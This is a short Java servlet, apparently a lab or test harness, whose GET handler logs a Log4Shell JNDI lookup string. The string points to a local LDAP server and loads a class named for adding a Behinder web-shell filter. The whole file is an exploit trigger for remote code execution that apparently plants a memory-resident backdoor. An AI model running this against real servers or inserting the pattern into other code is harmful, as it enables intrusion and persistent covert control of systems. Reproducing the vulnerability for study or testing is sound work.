import javax.servlet.*;
import javax.servlet.http.*;
import javax.servlet.annotation.*;
import java.io.IOException;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

@WebServlet(name = "Log4j2RCEServlet", value = "/Log4j2RCEServlet")
public class Log4j2RCEServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        System.out.println("Log4j2RCE Servlet Test ......");
        Logger log = LogManager.getLogger();
        log.error("${jndi:ldap://127.0.0.1:8888/BehinderAddFilter}");
    }

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {

    }
}
